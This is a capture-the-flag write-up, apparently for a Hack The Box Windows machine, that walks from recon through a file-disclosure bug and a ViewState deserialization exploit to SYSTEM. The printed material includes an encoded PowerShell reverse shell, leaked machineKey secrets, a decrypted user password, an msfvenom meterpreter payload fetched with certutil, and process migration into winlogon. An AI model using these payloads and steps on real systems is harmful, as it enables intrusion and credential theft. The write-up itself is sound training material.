Nmap Port Scan :

```php
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.251 -oN ports                                                                                                 ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 22:22 IST
Nmap scan report for 10.10.11.251
Host is up (0.16s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds	
```

Nmap Full Scan :

```php
❯ nmap -p80 -sCV 10.10.11.251 --min-rate 5000 --script vuln        
         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 22:24 IST
Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.32% done; ETC: 22:26 (0:00:04 remaining)
Nmap scan report for 10.10.11.251
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

No interesting output .

FFUF Scan :
```
❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://pov.htb/ -H 'Host: FUZZ.pov.htb' -fs 12330                                

<SNIP>

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 166ms]                                                                           
:: Progress: [19966/19966] :: Job [1/1] :: 96 req/sec :: Duration: [0:01:33] :: Errors: 
```

Added `dev.pov.htb` to `/etc/hosts` file.

![[Pasted image 20240203003303.png]]

This gave hint that there might be aspx files hosted on the server . Also to confirm there was a `contact.aspx`.

![[Pasted image 20240203003731.png]]

<h2> LFI </h2>

![[Pasted image 20240203004230.png]]

I captured that request in burp :

![[Pasted image 20240203005441.png]]

In the file Param we can perform the LFI. And if we look at the response we can see that it is running older version of AspNet

![[Pasted image 20240203005614.png]]

After looking at the parameters and the ASP Net version. I found this vuln :
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret

Using lfi , I first read the web.config file, which gave the hint for the above vuln

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

Using `ysoserial.exe` I generated a payload :

```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
 Copied the output and sent in the  `__VIEWSTATE` parameter :


```bash
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
Content-Length: 3505
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/default.aspx
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=c32YwH4yzbD1K5CIy0V1%2BedcnIDFNRF8k%2B%2Ftw2JiIPJJ1hDEL4BoKa0V%2Blk%2Bt43bEv7GY0RQzQCPvCbWfqvcqn4%2FhNrRBrteLViLxTpVWJDGGzspjigsnhKv2Xpwx8ZMRKGSANvGTVDYuvpj7n%2Fmbf3LOwE3pquK91S%2BOutfVXxMQb8xdG8LeBCSdAC%2FbERWZ%2FYBM%2Fsi3Wsf0xlEdoQH98vfk5kiEX9akUX1umUxh%2BQYUy4wMTAgkE%2B3cC6NqZ4gQ0puhntDicrnPfUcNdLvgrFDhG43%2F664qyKGuVwtQB7JoFwy6zna%2BSFXYmRafHBBXabhFQ7lUL5pnia9%2BAKskajtT5GKExXb3rDGXNR26RQM2uKdRwudDoH3PuADgaNetIJSVOJcV1g99qWTkzvMfLYJ2cA%2FCk4DuVIGf4vSSg2%2FEzhLqC5tnoimE0Dr8PEPPTLjgJ2oMEMyAYoZKAl5IvKOtgipDz3FcP1nwyBcq1U4gxO68sm%2FnpilDFtTbdARG51QSc7n25amp5AvQUFlKdUcFPnWxJSTjT6cQ72vvUyzwrpQwNjJLCtCwCod7wBhHXAZOiDgHXRu6B7XbjYAG0lSRcelbfZoxK1fg%2F3JzrhurbiVlowamCEtxXxZ59WWaaBnlLKfsAQdb1xaodmtSItpHJP7cefDyrFW1wRMttTMOMeOIxi%2FRj3qDq3ODwMfyEouAuqgh0%2BzJeCwnOrRowCTPNV%2FdHDUdJCr8o5epgWEA8OlPxMKe1qA%2Br75dMVM1MnyxOKs7yekxw1QMcdljroTj1ZAlcUH1qdsMrjw0iBPuxh9M0FY7vex6BTR2lpdZbm0YtCfyhP4mxSaHSgF0bnTmmqzorxVF4fjdkFJ4704xuKpJUxTDCAnJ4hv1Tnr2NuE1oXdkzrBYOLOqv%2BunFgj2VQirJD5C1Q%2BQxWV29nnOWhgrBrOhoS7nV3AkcjHWjfNdlqfuOewN5oPRjH4eeMgFVY6vjSsxOG97ycWHmGgzbGuu4RyUfS%2BvGhLyZV00mimrh3S%2BmycwOG2fO3v0BgRjVojKumFc48FexW5bSfZQjkPk%2B8%2BsYYYJL4CQoYXiZlC0fXyH%2FhXRoIZF3YxpRM2kb3LV7tf1YlxwberS69dw8hxFjjfP%2BpFOk1BkznizIHJS7aw1zeDcmVscMkwlwSrg0PJTTYI3Z5A6jTS6c5xokp%2FOgUak0U6cotM5GrJ92BF6QZvtqtnBySHKhStbI3umzRaI11uV0IMunBdixakBvDM8smp3W6VOth2Z%2BEfC8z3CBR2utf8BrZHnxdntIXl48ZFMvXwMIREvaCitK2SSNzVFR%2BIg%2B3RBPHk3P7v4qwaC30BHGUQiUOVL3r1pynFO%2BYl1BmChnyuuPg9F0W3edhdyQmp3w6ZN3TO6QJ7EFBI6xT3Qey2p9GpNslsDiEY%2B8XM8eVL1Ou2QqVY2i6WcFejXqS0Pzs6z7q78tjxtkEAy9yOUABQzsu9zSrGw1kKi4%2BAEph%2Bh%2F4wgnhTOyZU%2Fv8LoujXbo0gDvLi%2FOLc%2BO7ATbjfl4X6PN4GGgWH920BNW3atDLdGUqB%2BaPqSNiQdlFIEWSPTmOeIDxgO70FnSIThCKoDB6hBxJnsYSmpyb%2Bi9AXCnPPOZJ2k7fcx0mHnLbgKd7T1PCKzdlO9iRPP5Fw9fygh3wNFYdIIx6q6maIGj7YrruCCIXCHEkFafFcbdLaDNi9CBdCX7oYKCenYfo%2FMEpQCodSWYjm3iuMrZ7oncNfEM5wgkIGKElKLLi2GNRSeQ4ILjnBScW5xrp1lXK%2B%2FULHvYoLBYIUdCLdv8QdUacScXM8fUy6xemV6nVZ6J%2Fzy8Lft3CkR1QaVc5EQcIZbWdtqn5TzyLar%2BiXsxhrYrmwafOYOuJhMiVC1K0gA1QL3Twxt94yrviMV8x4FNV46Iefj81Vo%2BN7RN07KEISnHqI9v8gCDSOmYpmYuxakgejtoeogjozmAFDBG6DYP36llliFi5o84K%2Fk%2Fs2e%2FhmTVKxP%2BbHixjGD6Rl4kIL1mHYPN2SML4e06l7heY0Qztw4%2Fi50ptE8i%2FXt3OMa9m0hM1grd6ZD5RA2XCDB9Z6d8Ws632XNJAr8BhoGBTv%2FBcoPl5FDjfdOqn3u9v%2FoE%2BkxPg5wSgOO5%2FE1aePcNM12QZMsvgnbS%2BW8ZhJI56e7Ct%2BgoqrL2K2AyhMW9eZhhKokB9PMzUCnFA9gtH7VvDnNPpEgtZVQgmdpGr2F556x%2FUC8IGsCwjxUj3qvj0BXOl5EPHGH%2BCZCMPcrwVVQXyw86vUCJKSgNlnx2OD6PybZajyacNFrW7t%2BJFgF39OWEtv95L%2FSpUabTR5WmLNePEeuAJazyiYOsYavTfFsgGrHqNHW28sq3MRkD%2Bk33uv970Z%2Fn%2F8O%2F96ObW67ryd0V4Y5LJJI0VIjf2DyXiLcWvoFKkZ6Yr45eOHqrHsOnoE80b6cwonZ6beLqqNk0AKra%2BqD%2BZ3QTbfM%2F1lee0yDePd7KyG4Svdw7JYUVChhAgLR1oqa5zsheoMjfjXhYLNZIi57idjTVdPFOYjliY%2BjLi7usHTvGrku2RA5DrZnvGMcn1PcMlQ%2BzqVhD1x%2FYhCQdfQd3ZedVsv8EeCaX%2BDTvlfMmMG5eR157JRCQCGddiYDwFm9oDOSsucJTInT8%2F6cXrUYqKheJWoVhX7XI8qvWq7SWECqjxpUtgbT1qbLjx7lhN2nCUVdbkKAMZXkh6XvNxS91u4IgIaCkuts1kwGVobX3JvpJrsNd6vZFTcYKbZ2GW9OcBCNiZv02hJNhwL5PnXLq4kpYzMCfmOFSnt3z7f9hlP0DsajpQjtm3rxCYl8nMn71ia%2Fkd3ltxFf9B%2FMnKfOyQoxVbdxJ%2B4IYJIp5XB9f4oQjUJNoctZXtmHNJgHGS9jgd8JPSkvaOPWt6JXR0v%2FQDZSZuwyrbxh1GbqRmlLZ5UKxqrxVKmwMzj2v4vbCMjhKixnX0vF68yZJRx787VGuqo%2B3BtUiQsl2rbIi65nSdqEgYVAHCUBe7MLIhEO6naDAiU9IB5KbZoXeNqQR35wecmgdnduffXMDmzqIvGM0CtEg%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=hKNIaPo6RqJUWvp4IMAHnl0FcCjcI%2F6jcug7U4K5%2Bd18WWERFvrp7tQN84nYQrEEBzplAS8xE81deRUBZS44UJi6BWJDXSw3hhaBvWIYS3AQIYxlLCEkKPklQSYIgxzcou9aLw%3D%3D&file=..\web.config
```

Got shell connected as user sfitz

![[Pasted image 20240203012013.png]]

In the sfitz's document directory I saw xml file which had the SecureString Password :

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```
![[Pasted image 20240203012545.png]]

To decrypt it , I used powershell function :

```
$Credential = Import-Clixml -Path c:\users\sfitz\documents\connection.xml
$Credential.UserName
$Credential.GetNetWorkCredential().password
```

This got us the password for the user 
![[Pasted image 20240203012755.png]]

```alaading:f8gQ8fynP44ek1m3```

Reading User.txt using runas command 

```.\runas.exe alaading f8gQ8fynP44ek1m3 "cmd /c type C:\Users\alaading\Desktop\user.txt" ```
![[Pasted image 20240203012925.png]]

To get shell as user <b>allading </b>  I used runas to remotely execute the command.

```.\runas.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.8:7143```

This command remotely started the process and we got the shell as user **alaading**

![[Pasted image 20240203144640.png]]

We can see that we have SeDebugPrivilege

I created one more meterpreter payload :

```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=7143 -f exe > rev.exe
```

Moved it to `C:\Users\alaadin\Documents` using certutil :

```php
certutil -urlcache -f http://10.10.16.8/rev.exe rev.exe
```

Then ran rev.exe and got the shell on meterpreter :

![[Pasted image 20240203150205.png]]

## Abusing SeDebugPrivileges

### Tranferring files :


|**Filename** | Links|
 | --- | --- |
|  EnableAllTokenPrivs.ps1| https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1 |

Now using `certutil` the ps script is transferred.

![[Pasted image 20240203152238.png]]

1.  First `ps` to check all the process which is running as `system`
2. Lookout for `winlogon.exe`
3. copy the pid and run `migrate <pid>` 
4. run shell

![[Pasted image 20240203152543.png]]

type root.txt

![[Pasted image 20240203152624.png]]
